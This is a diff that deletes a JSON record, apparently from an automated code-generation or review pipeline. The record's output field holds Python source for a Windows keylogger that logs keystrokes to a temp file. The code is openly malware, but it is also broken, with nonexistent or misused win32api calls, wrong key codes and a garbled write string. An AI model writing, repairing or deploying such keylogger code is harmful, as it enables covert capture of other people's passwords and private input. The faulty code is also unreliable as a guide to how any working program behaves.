@@ -1,6 +1,0 @@
-{
-  "output": "import os\nimport tempfile\nimport win32api\ntemp_dir = tempfile.gettempdir()\nlog_file_path = os.path.join(temp_dir, 'keylogs.txt')\ndef on_key_event(event):\n    with open(log_file_path, 'a') as log_file:\n        key = win32api.GetKeyState(event)\n        if key == 0x1E:\n            log_file.write('[ENTER]\n')\n        elif key == 0x1D:\n            log_file.write('[SHIFT]</n')\n        else:\n            log_file.write(chr(key))\n        print('Key captured', chr(key))\nwin32api.SetWinEventHook(0, 0xFFFF, None, on_key_event, 0, 0, 1)\n\nprint('Starting keylogger...')\nwin32api.PumpMessages()",
-  "notes": "Initial code submitted for review.",
-  "applied_fixes": [],
-  "iterations": 1
-}
